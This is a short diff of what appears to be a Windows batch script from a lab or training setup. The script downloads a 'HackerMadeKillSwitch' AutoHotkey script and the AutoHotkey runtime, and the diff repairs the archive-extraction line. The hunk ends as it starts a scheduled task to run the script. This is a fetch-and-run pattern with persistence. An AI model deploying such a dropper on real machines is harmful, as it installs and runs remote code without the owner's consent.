@@ -11,7 +11,7 @@ curl -o "C:\Users\c4mlabuser9\Desktop\HackerFolder\HackerMadeKillSwitch.ahk" htt
 powershell -Command "Invoke-WebRequest -Uri 'https://www.autohotkey.com/download/1.1/AutoHotkey_1.1.36.02.zip' -OutFile 'C:\Users\c4mlabuser9\Desktop\HackerFolder\AHK.zip'"
 
 :: Extract AutoHotkey ZIP
-'C:\Users\c4mlabuser9\Desktop\HackerFolder\AHK.zip' -DestinationPath 'C:\Users\c4mlabuser9\Desktop\HackerFolder\AHK' -Force"
+powershell -Command "Expand-Archive -Path 'C:\Users\c4mlabuser9\Desktop\HackerFolder\AHK.zip' -DestinationPath 'C:\Users\c4mlabuser9\Desktop\HackerFolder\AHK' -Force"
 
 :: Create scheduled task to run AHK script
 schtasks /Create /TN "NewHackerMadeKillSwitchRunner" ^
